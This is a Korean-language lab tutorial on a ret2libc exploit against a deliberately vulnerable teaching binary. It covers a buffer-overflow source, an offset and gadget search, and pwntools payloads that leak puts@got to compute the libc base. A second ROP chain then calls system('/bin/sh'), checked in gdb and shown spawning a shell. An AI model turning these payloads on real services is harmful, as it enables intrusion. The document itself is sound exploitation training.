# 04 · ret2libc (libc leak) 디버깅

## 소스 요지
```c
void gadget() { asm volatile("pop %rdi; ret"); }  // 교육용 pop rdi 가젯
void vuln() { char buf[0x40]; read(0, buf, 0x100); }   // BOF
int main() { puts("go"); vuln(); vuln(); }             // 2번 → leak, 공격
```
`checksec`: NX / No Canary / No-PIE / 동적링크.
NX라 셸코드 못 올림 → **libc의 `system("/bin/sh")` 재사용**.

> 최신 glibc(2.34+)엔 `__libc_csu_init`의 `pop rdi/rsi` 가젯이 사라짐.
> 그래서 교육용으로 `gadget()`에 `pop rdi; ret`을 심음. 실전에선 **libc 안**의
> `pop rdi; ret`(ASLR이라 leak 후 `libc.address + offset`)을 씀.

## 왜 2단계인가
ASLR로 libc 주소를 모름 → **① 먼저 libc 함수 실주소를 leak**해서 base 계산 →
**② 그 base로 `system`과 `"/bin/sh"` 주소를 구해 2차 공격**. 그래서 `vuln()` 2번.

## 1) 오프셋 & 가젯
```
buf = rbp-0x40 → ret까지 = 0x40 + saved rbp 8 = 0x48
$ ROPgadget --binary vuln | grep 'pop rdi'
0x000000000040114a : pop rdi ; ret
```

## 2) 1단계 — puts로 puts@got leak
`puts(puts@got)` = GOT에 든 **puts의 libc 실주소**를 출력.
```python
payload  = b'A'*0x48
payload += p64(pop_rdi) + p64(e.got['puts'])   # rdi = &puts@got
payload += p64(e.plt['puts'])                   # puts(rdi)
payload += p64(e.symbols['main'])               # 출력 후 main 재실행
```
```
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.symbols['puts']
# 실측: puts=0x75f039f3e860 → libc base=0x75f039eb0000  (끝 000 = 페이지정렬 OK)
```

## 3) gdb로 base 검산
```
pwndbg> vmmap libc                 # libc 매핑 시작주소 확인
0x75f039eb0000 ... libc.so.6       ← 계산한 base와 일치해야 함
pwndbg> p system                   # (심볼 있으면) system 주소
pwndbg> search -t string "/bin/sh" libc   # /bin/sh 위치
```

## 4) 2단계 — system("/bin/sh")
```python
binsh = next(libc.search(b'/bin/sh\x00'))
payload  = b'A'*0x48 + p64(ret)                 # ret 하나로 16정렬
payload += p64(pop_rdi) + p64(binsh)
payload += p64(libc.symbols['system'])
```
`ret` 패딩 한 개: `system` 내부 `movaps` 정렬용 (01번 예제와 동일 이유).

## 5) 동작
```
$ make run
[+] puts = 0x75f039f3e860 → libc base = 0x75f039eb0000
PWNED
```

> 가젯이 정말 없으면 **ret2csu** 또는 **SROP**(공략노트 5-2)로 레지스터를 세팅.
